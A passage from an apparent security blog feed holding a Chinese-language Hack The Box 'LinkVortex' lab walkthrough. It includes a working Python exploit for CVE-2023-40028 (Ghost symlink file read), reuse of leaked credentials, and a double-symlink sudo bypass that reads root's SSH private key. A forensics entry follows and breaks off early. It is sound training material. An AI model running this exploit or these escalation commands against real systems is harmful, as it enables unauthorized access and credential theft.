href="#git-æ³„éœ²" class="headerlink" title="git æ³„éœ²"></a>git æ³„éœ²</h1><p>ç”¨ <a href="https://github.com/arthaud/git-dumper/tree/master">git-dumper</a> æŠŠä»“åº“ dump åˆ°æœ¬åœ°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git-dumper http://dev.linkvortex.htb/.git ./<br></code></pre></td></tr></table></figure><p>ç”¨ <code>git status</code> æŸ¥çœ‹ä»“åº“çš„çŠ¶æ€</p><p><img src="https://img.dkdun.cn/v1/2025/12/cadfce2f14c13dfc.png"></p><p>æŸ¥çœ‹æœ€è¿‘æ›´æ–°çš„ <code>/ghost/core/test/regression/api/admin</code> ä¸‹çš„ <code>authentication.test.js</code> æ–‡ä»¶ï¼Œåœ¨å…¶ä¸­å‘ç°äº†ä¸€äº›å½¢å¦‚ä¸‹å›¾çš„ email å’Œ password</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;complete setup&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">const</span> email = <span class="hljs-string">&#x27;test@example.com&#x27;</span>;<br>        <span class="hljs-keyword">const</span> password = <span class="hljs-string">&#x27;OctopiFociPilfer45&#x27;</span>;<br><br>        <span class="hljs-keyword">const</span> requestMock = <span class="hljs-title function_">nock</span>(<span class="hljs-string">&#x27;https://api.github.com&#x27;</span>)<br>          .<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/repos/tryghost/dawn/zipball&#x27;</span>)<br>          .<span class="hljs-title function_">query</span>(<span class="hljs-literal">true</span>)<br>          .<span class="hljs-title function_">replyWithFile</span>(<span class="hljs-number">200</span>, fixtureManager.<span class="hljs-title function_">getPathForFixture</span>(<span class="hljs-string">&#x27;themes/valid.zip&#x27;</span>));<br></code></pre></td></tr></table></figure><p>å» <code>linkvortex.htb/ghost/#/signin</code> å°è¯•ç™»å½•ï¼Œæœ‰å¾ˆå¤šä¸ª email å’Œ passwd éƒ½ç™»ä¸è¿›å»</p><p>å‰é¢åœ¨ç½‘é¡µä¸­å‘ç°æœ‰ admin è´¦æˆ·ï¼Œæ„é€  <code>admin@linkvortex.htb</code> é‚®ç®±ï¼Œæœ€åç”¨ä¸‹é¢çš„ç”¨æˆ·åå’Œå¯†ç ç™»å½•è¿›å»äº†</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">admin<span class="hljs-keyword">@linkvortex</span>.<span class="hljs-attribute">htb</span>:OctopiFociPilfer45<br></code></pre></td></tr></table></figure><h2 id="è¿›å…¥åå°"><a href="#è¿›å…¥åå°" class="headerlink" title="è¿›å…¥åå°"></a>è¿›å…¥åå°</h2><p>ç™»é™†è¿›å»åé€šè¿‡ Wappalyzer  å¯ä»¥å‘ç°å½“å‰ <code>Ghost</code> çš„ç‰ˆæœ¬æ˜¯ 5.58ï¼Œæ‰¾åˆ°äº†ç›¸å…³ CVEï¼š<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-40028">CVE-2023-40028</a>ï¼Œ 5.59.1 ä¹‹å‰çš„ç‰ˆæœ¬å…è®¸ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ä¸Šä¼ ç¬¦å·é“¾æ¥æ–‡ä»¶ï¼ˆsymlinksï¼‰ï¼Œå¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–æ“ä½œ</p><h1 id="æ ¹æ®æ¼æ´å†™-POC-è„šæœ¬"><a href="#æ ¹æ®æ¼æ´å†™-POC-è„šæœ¬" class="headerlink" title="æ ¹æ®æ¼æ´å†™ POC è„šæœ¬"></a>æ ¹æ®æ¼æ´å†™ POC è„šæœ¬</h1><p>poc for <a href="https://github.com/buutt3rf1y/CVE-2023-40028/">CVE-2023-40028</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> getopt<br><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">usage</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Usage: <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">0</span>]&#125;</span> --url &lt;http://example.com&gt; -u &lt;username&gt; -p &lt;password&gt;&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_random_name</span>(<span class="hljs-params">length=<span class="hljs-number">13</span></span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=length))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_exploit</span>(<span class="hljs-params">file_to_read, payload_path, image_name</span>):<br>    <span class="hljs-comment"># åˆ›å»ºå®Œæ•´çš„ç›®å½•ç»“æ„</span><br>    image_dir = payload_path / <span class="hljs-string">&quot;content/images/2024&quot;</span><br>    image_dir.mkdir(parents=<span class="hljs-literal">True</span>, exist_ok=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment"># åˆ›å»ºç¬¦å·é“¾æ¥æ–‡ä»¶</span><br>    symlinks_path = image_dir / <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;image_name&#125;</span>.png&quot;</span><br><br>    <span class="hljs-comment"># åˆ›å»º symlinks</span><br>    os.system(<span class="hljs-string">f&quot;ln -s <span class="hljs-subst">&#123;file_to_read&#125;</span> <span class="hljs-subst">&#123;symlinks_path&#125;</span>&quot;</span>)<br>    <span class="hljs-comment"># æ‰“åŒ… zip</span><br>    os.system(<span class="hljs-string">f&quot;zip -r -y <span class="hljs-subst">&#123;payload_path&#125;</span> ./exp/ &amp;&gt;/dev/null&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clean</span>(<span class="hljs-params">payload_path, image_name</span>):<br>    <span class="hljs-comment"># æ¸…ç†äº§ç”Ÿçš„æ–‡ä»¶</span><br>    os.system(<span class="hljs-string">f&quot;rm -f <span class="hljs-subst">&#123;payload_path&#125;</span>/content/images/2024/<span class="hljs-subst">&#123;image_name&#125;</span>.png&quot;</span>)<br>    os.system(<span class="hljs-string">f&quot;rm -f <span class="hljs-subst">&#123;payload_path&#125;</span>.zip&quot;</span>)<br>    os.system(<span class="hljs-string">f&quot;rm -rf <span class="hljs-subst">&#123;payload_path&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">try</span>:<br>        opts, _ = getopt.getopt(sys.argv[<span class="hljs-number">1</span>:], <span class="hljs-string">&quot;u:p:&quot;</span>, [<span class="hljs-string">&quot;url=&quot;</span>])<br>    <span class="hljs-keyword">except</span> getopt.GetoptError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Usage: <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">0</span>]&#125;</span> --url &lt;http://example.com&gt; -u &lt;username&gt; -p &lt;password&gt;&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># ä»å‘½ä»¤è¡Œè¯»å–å‚æ•°æ‰§è¡Œ</span><br>    Ghost_Url = username = password = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> opt, arg <span class="hljs-keyword">in</span> opts:<br>        <span class="hljs-keyword">if</span> opt == <span class="hljs-string">&quot;-u&quot;</span>:<br>            username = arg<br>        <span class="hljs-keyword">elif</span> opt == <span class="hljs-string">&quot;-p&quot;</span>:<br>            password = arg<br>        <span class="hljs-keyword">elif</span> opt == <span class="hljs-string">&quot;--url&quot;</span>:<br>            Ghost_Url = arg.rstrip(<span class="hljs-string">&quot;/&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (Ghost_Url <span class="hljs-keyword">and</span> username <span class="hljs-keyword">and</span> password):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Necessary parameters are missing,maybe url or username or password...&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    Ghost_API = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;Ghost_Url&#125;</span>/ghost/api/v3/admin/&#x27;</span><br>    payload_path = Path(__file__).parent / <span class="hljs-string">&quot;exp&quot;</span><br>    payload_path.mkdir(exist_ok=<span class="hljs-literal">True</span>, parents=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment"># curl åˆ›å»ºä¼šè¯å¹¶ä¿å­˜ cookie</span><br>    os.system(<br>        <span class="hljs-string">f&quot;curl -c cookie.txt -d username=<span class="hljs-subst">&#123;username&#125;</span> -d password=<span class="hljs-subst">&#123;password&#125;</span> -H \&quot;Origin: <span class="hljs-subst">&#123;Ghost_Url&#125;</span>\&quot; -H \&quot;Accept-Version: v3.0\&quot; <span class="hljs-subst">&#123;Ghost_API&#125;</span>session/ &gt; /dev/null 2&gt;&amp;1&quot;</span>)<br><br>    <span class="hljs-comment"># æ£€æµ‹ cookie æ˜¯å¦æœ‰æ•ˆ</span><br>    <span class="hljs-keyword">if</span> os.system(<span class="hljs-string">&quot;grep -q ghost-admin-api-session cookie.txt&quot;</span>) != <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid username or password&quot;</span>)<br>        os.system(<span class="hljs-string">f&quot;rm -f cookie.txt&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        file_to_read = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;file&gt; &quot;</span>).strip()<br>        <span class="hljs-keyword">if</span> file_to_read.lower() == <span class="hljs-string">&quot;exit&quot;</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot; &quot;</span> <span class="hljs-keyword">in</span> file_to_read <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> file_to_read:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;please enter a valid file path:&quot;</span>)<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file_to_read:<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-comment"># ç”Ÿæˆ payload</span><br>        image_name = generate_random_name()<br>        generate_exploit(file_to_read, payload_path, image_name)<br><br>        <span class="hljs-comment"># ä¸Šä¼  zip</span><br>        upload_path = os.popen(<br>            <span class="hljs-string">f&#x27;curl -s -b cookie.txt &#x27;</span><br>            <span class="hljs-string">f&#x27;-H &quot;X-Ghost-Version: 5.58&quot; &#x27;</span><br>            <span class="hljs-string">f&#x27;-H &quot;Referer: <span class="hljs-subst">&#123;Ghost_Url&#125;</span>/ghost/&quot; &#x27;</span><br>            <span class="hljs-string">f&#x27;-H &quot;Origin: <span class="hljs-subst">&#123;Ghost_Url&#125;</span>&quot; &#x27;</span><br>            <span class="hljs-string">f&#x27;-F &quot;importfile=@./exp.zip;type=application/zip&quot; &#x27;</span><br>            <span class="hljs-string">f&#x27;&quot;<span class="hljs-subst">&#123;Ghost_Url&#125;</span>/ghost/api/v3/admin/db&quot;&#x27;</span><br>        ).read()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;error&quot;</span> <span class="hljs-keyword">in</span> upload_path.lower():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;upload failed: <span class="hljs-subst">&#123;upload_path&#125;</span>!!!&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;upload successful!!!&quot;</span>)<br>            <br>        <span class="hljs-comment"># è¯»å–ç›®æ ‡æ–‡ä»¶</span><br>        file_url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;Ghost_Url&#125;</span>/content/images/2024/<span class="hljs-subst">&#123;image_name&#125;</span>.png&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;requesting <span class="hljs-subst">&#123;file_url&#125;</span>&quot;</span>)<br>        response = os.popen(<span class="hljs-string">f&quot;curl -b cookie.txt -s <span class="hljs-subst">&#123;file_url&#125;</span>&quot;</span>).read()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Not Found&quot;</span> <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;file <span class="hljs-subst">&#123;file_url&#125;</span> not found&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Received!&quot;</span>)<br>            <span class="hljs-built_in">print</span>(response)<br><br>        clean(payload_path, image_name)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 exp.py --url http://linkvortex.htb/ -u admin@linkvortex.htb -p OctopiFociPilfer45<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/db9cabf1ef5d1047.png"></p><p>èƒ½å¤ŸæˆåŠŸè¯»å– <code>/etc/passwd</code> ä¸‹çš„æ–‡ä»¶ï¼Œä½†æ˜¯å…¶ä¸­å¹¶æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ç”¨æˆ·</p><p>å½“è®¿é—® dump ä¸‹æ¥ä»“åº“ä¸­çš„ <code>Dockerfile.ghost</code> æ–‡ä»¶æ—¶å‘ç°</p><p><img src="https://img.dkdun.cn/v1/2025/12/4661678031b00741.png"></p><p>å½“å‰ç›®å½•ä¸‹çš„ <code>config.production.json</code> æ–‡ä»¶å¤åˆ¶åˆ°é•œåƒå†…éƒ¨çš„ <code>/var/lib/ghost/</code> ç›®å½•ä¸‹</p><p>æ¥è¯»å–ä¸€ä¸‹ <code>/var/lib/ghost/config.production.json</code> æ–‡ä»¶</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs yaml">&#123;<br>  <span class="hljs-attr">&quot;url&quot;:</span> <span class="hljs-string">&quot;http://localhost:2368&quot;</span>,<br>  <span class="hljs-attr">&quot;server&quot;:</span> &#123;<br>    <span class="hljs-attr">&quot;port&quot;:</span> <span class="hljs-number">2368</span>,<br>    <span class="hljs-attr">&quot;host&quot;:</span> <span class="hljs-string">&quot;::&quot;</span><br>  &#125;,<br>  <span class="hljs-attr">&quot;mail&quot;:</span> &#123;<br>    <span class="hljs-attr">&quot;transport&quot;:</span> <span class="hljs-string">&quot;Direct&quot;</span><br>  &#125;,<br>  <span class="hljs-attr">&quot;logging&quot;:</span> &#123;<br>    <span class="hljs-attr">&quot;transports&quot;:</span> [<span class="hljs-string">&quot;stdout&quot;</span>]<br>  &#125;,<br>  <span class="hljs-attr">&quot;process&quot;:</span> <span class="hljs-string">&quot;systemd&quot;</span>,<br>  <span class="hljs-attr">&quot;paths&quot;:</span> &#123;<br>    <span class="hljs-attr">&quot;contentPath&quot;:</span> <span class="hljs-string">&quot;/var/lib/ghost/content&quot;</span><br>  &#125;,<br>  <span class="hljs-attr">&quot;spam&quot;:</span> &#123;<br>    <span class="hljs-attr">&quot;user_login&quot;:</span> &#123;<br>        <span class="hljs-attr">&quot;minWait&quot;:</span> <span class="hljs-number">1</span>,<br>        <span class="hljs-attr">&quot;maxWait&quot;:</span> <span class="hljs-number">604800000</span>,<br>        <span class="hljs-attr">&quot;freeRetries&quot;:</span> <span class="hljs-number">5000</span><br>    &#125;<br>  &#125;,<br>  <span class="hljs-attr">&quot;mail&quot;:</span> &#123;<br>     <span class="hljs-attr">&quot;transport&quot;:</span> <span class="hljs-string">&quot;SMTP&quot;</span>,<br>     <span class="hljs-attr">&quot;options&quot;:</span> &#123;<br>      <span class="hljs-attr">&quot;service&quot;:</span> <span class="hljs-string">&quot;Google&quot;</span>,<br>      <span class="hljs-attr">&quot;host&quot;:</span> <span class="hljs-string">&quot;linkvortex.htb&quot;</span>,<br>      <span class="hljs-attr">&quot;port&quot;:</span> <span class="hljs-number">587</span>,<br>      <span class="hljs-attr">&quot;auth&quot;:</span> &#123;<br>        <span class="hljs-attr">&quot;user&quot;:</span> <span class="hljs-string">&quot;bob@linkvortex.htb&quot;</span>,<br>        <span class="hljs-attr">&quot;pass&quot;:</span> <span class="hljs-string">&quot;fibber-talented-worth&quot;</span><br>        &#125;<br>      &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¾—åˆ°ç”¨æˆ·åå’Œå¯†ç </p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">bob<span class="hljs-keyword">@linkvortex</span>.<span class="hljs-attribute">htb</span>:fibber-talented-worth<br></code></pre></td></tr></table></figure><p>ssh è¿æ¥æ‹¿åˆ° userflag</p><h1 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h1><h2 id="sudo-l-æŸ¥çœ‹å¯-sudo-æ‰§è¡Œçš„æ–‡ä»¶"><a href="#sudo-l-æŸ¥çœ‹å¯-sudo-æ‰§è¡Œçš„æ–‡ä»¶" class="headerlink" title="sudo -l æŸ¥çœ‹å¯ sudo æ‰§è¡Œçš„æ–‡ä»¶"></a>sudo -l æŸ¥çœ‹å¯ sudo æ‰§è¡Œçš„æ–‡ä»¶</h2><p>ç”¨ <code>sudo -l</code> å‘ç°å¯ä»¥æ‰§è¡Œ <code>/opt/ghost/</code> ç›®å½•ä¸‹çš„ <code>clean_symlink.sh</code> æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">bob@linkvortex:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> bob on linkvortex:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT<br><br>User bob may run the following commands on linkvortex:<br>    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆåˆ‡å…¥ç‚¹åº”è¯¥å°±åœ¨è¿™ä¸ªæ–‡ä»¶ä¸Šé¢ï¼ŒæŸ¥çœ‹æ–‡ä»¶å†…å®¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>QUAR_DIR=<span class="hljs-string">&quot;/var/quarantined&quot;</span><br><br><span class="hljs-keyword">if</span> [ -z <span class="hljs-variable">$CHECK_CONTENT</span> ];<span class="hljs-keyword">then</span><br>  CHECK_CONTENT=<span class="hljs-literal">false</span><br><span class="hljs-keyword">fi</span><br><br>LINK=<span class="hljs-variable">$1</span><br><br><span class="hljs-keyword">if</span> ! [[ <span class="hljs-string">&quot;<span class="hljs-variable">$LINK</span>&quot;</span> =~ \.png$ ]]; <span class="hljs-keyword">then</span><br>  /usr/bin/echo <span class="hljs-string">&quot;! First argument must be a png file !&quot;</span><br>  <span class="hljs-built_in">exit</span> 2<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> /usr/bin/sudo /usr/bin/test -L <span class="hljs-variable">$LINK</span>;<span class="hljs-keyword">then</span><br>  LINK_NAME=$(/usr/bin/basename <span class="hljs-variable">$LINK</span>)<br>  LINK_TARGET=$(/usr/bin/readlink <span class="hljs-variable">$LINK</span>)<br>  <span class="hljs-keyword">if</span> /usr/bin/echo <span class="hljs-string">&quot;<span class="hljs-variable">$LINK_TARGET</span>&quot;</span> | /usr/bin/grep -Eq <span class="hljs-string">&#x27;(etc|root)&#x27;</span>;<span class="hljs-keyword">then</span><br>    /usr/bin/echo <span class="hljs-string">&quot;! Trying to read critical files, removing link [ <span class="hljs-variable">$LINK</span> ] !&quot;</span><br>    /usr/bin/unlink <span class="hljs-variable">$LINK</span><br>  <span class="hljs-keyword">else</span><br>    /usr/bin/echo <span class="hljs-string">&quot;Link found [ <span class="hljs-variable">$LINK</span> ] , moving it to quarantine&quot;</span><br>    /usr/bin/mv <span class="hljs-variable">$LINK</span> <span class="hljs-variable">$QUAR_DIR</span>/<br>    <span class="hljs-keyword">if</span> <span class="hljs-variable">$CHECK_CONTENT</span>;<span class="hljs-keyword">then</span><br>      /usr/bin/echo <span class="hljs-string">&quot;Content:&quot;</span><br>      /usr/bin/cat <span class="hljs-variable">$QUAR_DIR</span>/<span class="hljs-variable">$LINK_NAME</span> 2&gt;/dev/null<br>    <span class="hljs-keyword">fi</span><br>  <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>æ£€æµ‹ä¼ å…¥çš„ <code>.png</code> æ–‡ä»¶æ˜¯å¦ä¸ºç¬¦å·é“¾æ¥ï¼Œå¦‚æœç¬¦å·é“¾æ¥æŒ‡å‘ <code>/etc</code> æˆ–è€… <code>/root</code> ç›®å½•å°±ç›´æ¥åˆ é™¤ï¼Œä¸æ˜¯çš„è¯å°±ç§»åŠ¨åˆ° <code>/var/quarantined</code> ç›®å½•ï¼Œå½“ <code>$CHECK_CONTENT= True</code>  æ—¶ä¼šæ‰§è¡Œ <code>cat</code> å‘½ä»¤æ˜¾ç¤ºè¯»å–çš„æ–‡ä»¶å†…å®¹</p><h2 id="åŒå±‚ç¬¦å·é“¾æ¥ç»•è¿‡æ£€æµ‹"><a href="#åŒå±‚ç¬¦å·é“¾æ¥ç»•è¿‡æ£€æµ‹" class="headerlink" title="åŒå±‚ç¬¦å·é“¾æ¥ç»•è¿‡æ£€æµ‹"></a>åŒå±‚ç¬¦å·é“¾æ¥ç»•è¿‡æ£€æµ‹</h2><p>å¦‚æœç›´æ¥é“¾æ¥ <code>/root</code> ä¸‹çš„æ–‡ä»¶è‚¯å®šä¼šè¢«æ£€æµ‹åˆ°ï¼Œç»•è¿‡æ–¹æ³•å°±æ˜¯åŒå±‚ç¬¦å·é“¾æ¥ï¼Œå°† <code>/root</code> ä¸‹çš„æ–‡ä»¶é“¾æ¥åˆ°å…¶ä»–æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ï¼Œç„¶åå†é“¾æ¥ä¸º <code>.png</code> æ–‡ä»¶å¾—ä»¥è¯»å–ï¼Œå› æ­¤æˆ‘ä»¬åœ¨ç°åœ¨çš„ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å»é“¾æ¥ <code>/root/.ssh/id_rsa</code> æ–‡ä»¶ï¼Œç„¶åç”¨ ssh ç§é’¥å»ç™»å½• root è´¦æˆ·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /root/.ssh/id_rsa rsa.txt<br><span class="hljs-built_in">ln</span> -s /home/bob/rsa.txt rsa.png<br><span class="hljs-built_in">sudo</span> CHECK_CONTENT=<span class="hljs-literal">true</span> /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/rsa.png<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/bf1aca72a04a5f6c.png"></p><p>å°†å¾—åˆ°çš„ç§é’¥ä¿å­˜ä¸º <code>id_rsa</code> ç»™ 600 çš„æƒé™ç™»å½•</p><p><img src="https://img.dkdun.cn/v1/2025/12/d3c38f7b2c47fe7e.png"></p><p>æˆåŠŸè¿›å…¥ root è´¦æˆ·</p>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€</category>
      
      <category>é¶æœº</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>symlinks</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Pikaptcha</title>
    <link href="/2025/04/13/HTB-Pikaptcha/"/>
    <url>/2025/04/13/HTB-Pikaptcha/</url>
    
    <content type="html"><![CDATA[<p>å…³äº Windows çš„æ³¨å†Œè¡¨å–è¯</p><span id="more"></span><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Happy Grunwald contacted the sysadmin, Alonzo, because of issues he had downloading the latest version of Microsoft Office. He had received an email saying he needed to update, and clicked the link to do it. He reported that he visited the website and solved a captcha, but no office download page came back. Alonzo, who himself was bombarded with phishing attacks last year and was now aware of attacker tactics, immediately notified the security team to isolate the machine as he suspected an attack. You are provided with network traffic and endpoint artifacts to answer questions about what happened.</p><h1 id="åˆ†æç”¨æˆ·-happy-grunwald-çš„æ³¨å†Œè¡¨é…ç½®å•å…ƒï¼ŒæŸ¥æ‰¾å…¶ä¸‹è½½å¹¶æ‰§è¡Œ-stager-çš„å®Œæ•´å‘½ä»¤"><a 